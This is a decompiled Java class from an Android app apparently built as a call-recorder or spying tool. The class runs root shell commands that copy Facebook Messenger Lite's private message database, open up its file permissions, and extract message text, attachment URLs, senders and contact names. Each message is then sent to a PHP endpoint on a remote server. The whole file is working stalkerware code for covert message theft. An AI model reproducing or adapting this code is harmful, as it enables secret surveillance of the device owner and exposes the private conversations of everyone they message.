package com.yasoka.spcallrecord.recorder.call.a.c.d;

import a.c.e.e;
import a.c.f.a;
import a.c.j.c;
import android.content.Context;
import android.database.Cursor;
import com.crashlytics.android.Crashlytics;
import java.io.DataOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import org.webrtc.MediaStreamTrack;

/* compiled from: GetDataFacebookLite */
public class b extends h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f157b;

    /* renamed from: a reason: collision with root package name */
    private final Context f158a;

    public b(Context context) {
        this.f158a = context;
    }

    /* JADX WARNING: Removed duplicated region for block: B:35:0x00fb A[Catch:{ Exception -> 0x011c }] */
    private void a(Context context, String str, String str2, long j) throws Exception {
        String str3;
        String str4;
        String str5;
        String string;
        String str6;
        Context context2 = context;
        SimpleDateFormat d2 = c.d();
        a aVar = new a(context2, str, str2);
        aVar.b();
        long j2 = j;
        Cursor a2 = aVar.a("messages", j2);
        if (a2 == null) {
            return;
        }
        if (a2.getCount() <= 0) {
            a(aVar, a2);
            return;
        }
        String str7 = "";
        long j3 = j2;
        String str8 = str7;
        String str9 = str8;
        while (a2.moveToNext()) {
            try {
                long j4 = a2.getLong(a2.getColumnIndexOrThrow("timestamp"));
                Date date = new Date();
                date.setTime(j4);
                Date date2 = new Date();
                date2.setTime(e.n(context));
                Calendar instance = Calendar.getInstance();
                instance.setTime(date2);
                instance.add(13, 1);
                if (date.compareTo(instance.getTime()) > 0) {
                    String string2 = a2.getString(a2.getColumnIndexOrThrow("snippet"));
                    if (string2 == null || string2.equals(str7)) {
                        try {
                            String string3 = a2.getString(a2.getColumnIndexOrThrow("media_preview_url"));
                            String string4 = a2.getString(a2.getColumnIndexOrThrow("attachment_filename"));
                            String string5 = a2.getString(a2.getColumnIndexOrThrow("attachment_mime_type"));
                            if (string5 == null || !string5.contains(MediaStreamTrack.VIDEO_TRACK_KIND)) {
                                StringBuilder sb = new StringBuilder();
                                sb.append("<img src='");
                                sb.append(string3);
                                sb.append("'/>");
                                str6 = sb.toString();
                            } else {
                                StringBuilder sb2 = new StringBuilder();
                                sb2.append("<a href='");
                                sb2.append(string3);
                                sb2.append("'>");
                                sb2.append(string4);
                                sb2.append("</a>");
                                str6 = sb2.toString();
                            }
                            str3 = str6;
                        } catch (Exception e2) {
                            e2.getStackTrace();
                            try {
                                e2.getStackTrace();
                                Crashlytics.logException(e2);
                            } catch (Exception unused) {
                            }
                        }
                        string = a2.getString(a2.getColumnIndexOrThrow("user_id"));
                        str8 = a2.getString(a2.getColumnIndexOrThrow("sender"));
                        if (string != null) {
                            Cursor a3 = aVar.a("contact", "contact_user_id", string);
                            if (!(a3 == null || a3.getCount() == 0)) {
                                a3.moveToFirst();
                                str4 = a3.getString(a3.getColumnIndexOrThrow("name"));
                                str5 = str8;
                                Date date3 = date;
                                a(context, str4, str3, str5, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                                j3 = date3.getTime();
                                str8 = str5;
                                str9 = str4;
                            }
                        }
                        str5 = str8;
                        str4 = str9;
                        Date date32 = date;
                        a(context, str4, str3, str5, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                        j3 = date32.getTime();
                        str8 = str5;
                        str9 = str4;
                    }
                    str3 = string2;
                    try {
                        string = a2.getString(a2.getColumnIndexOrThrow("user_id"));
                        str8 = a2.getString(a2.getColumnIndexOrThrow("sender"));
                        if (string != null) {
                        }
                    } catch (Exception e3) {
                        e3.getStackTrace();
                    }
                    str5 = str8;
                    str4 = str9;
                    Date date322 = date;
                    a(context, str4, str3, str5, d2.format(Long.valueOf(date.getTime())), "socialNetwork/root/insertFacebook.php");
                    j3 = date322.getTime();
                    str8 = str5;
                    str9 = str4;
                }
            } catch (Exception e4) {
                e4.getStackTrace();
                try {
                    e4.getStackTrace();
                    Crashlytics.logException(e4);
                } catch (Exception unused2) {
                }
            }
        }
        if (j3 != 0) {
            a.b.a.a.a.a(context2.getSharedPreferences("user", 0), "timefacebook", j3);
        }
        a(aVar, a2);
    }

    public void run() {
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        if (f157b) {
            a(this.f158a);
            return;
        }
        f157b = true;
        try {
            if (e.n(this.f158a) == 0) {
                a.c.e.c.c(this.f158a);
            }
            if (e.n(this.f158a) != 0) {
                long n = e.n(this.f158a);
                DataOutputStream dataOutputStream = new DataOutputStream(Runtime.getRuntime().exec("su").getOutputStream());
                StringBuilder sb = new StringBuilder();
                sb.append("cat ");
                sb.append("/data/data/com.facebook.mlite/databases/");
                sb.append("core.db");
                sb.append(" > ");
                sb.append(a.c.e.c.a());
                sb.append("Facebook.db");
                sb.append(" \n");
                dataOutputStream.writeBytes(sb.toString());
                StringBuilder sb2 = new StringBuilder();
                sb2.append("chmod 777 ");
                sb2.append(a.c.e.c.a());
                sb2.append("* \n");
                dataOutputStream.writeBytes(sb2.toString());
                StringBuilder sb3 = new StringBuilder();
                sb3.append("chmod -R 777 ");
                sb3.append(a.c.e.c.a());
                sb3.append("\n");
                dataOutputStream.writeBytes(sb3.toString());
                dataOutputStream.flush();
                dataOutputStream.writeBytes("exit\n");
                dataOutputStream.flush();
                Thread.sleep(10000);
                a(this.f158a, a.c.e.c.a(), "Facebook.db", n);
            }
        } catch (Exception e3) {
            e3.getStackTrace();
            try {
                e3.getStackTrace();
                Crashlytics.logException(e3);
            } catch (Exception unused) {
            }
        }
        f157b = false;
        a(this.f158a);
    }
}
